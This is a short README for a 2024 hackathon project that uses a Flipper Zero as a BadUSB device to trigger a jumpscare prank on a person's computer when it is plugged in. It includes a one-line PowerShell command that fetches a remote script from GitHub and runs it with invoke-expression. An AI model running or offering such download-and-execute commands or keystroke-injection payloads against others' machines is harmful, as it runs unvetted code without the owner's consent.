# Flipper Zero BadUSB

This project was done for the 2024 Hacknotts hackathon.

## Description

This script creates a jumpscare effect on a person's computer when the badUSB is plugged in. This project uses the flipper zero as a badUSB and I-Am-Jakoby's payload as a template.

## How to run program

Download the repository, unzip and move it in the flipper zero's badUSB folder. Plug in the USB on a laptop and then run the txt file. Alternatively, if you don't own a flipper zero, just run this command (all in one line) in powershell:  
```$pl = iwr https://raw.githubusercontent.com/Ta0hit/FlipperZero/refs/heads/main/RubberDucky-JumpScare/JumpScare.ps1?dl=1; invoke-expression $pl```
